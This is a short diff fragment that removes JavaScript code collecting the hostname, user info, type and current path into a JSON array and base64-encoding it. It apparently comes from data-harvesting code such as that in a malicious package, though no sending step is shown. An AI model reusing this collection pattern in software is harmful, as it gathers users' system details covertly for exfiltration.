@@ -1,7 +1,0 @@
-var hostname = os.hostname()
-json.push(hostname)
-json.push(type)
-json.push(userInfo)
-json.push(currentPath)
-json = JSON.stringify(json)
-var buff = Buffer.from(JSON.stringify(json)).toString("base64")
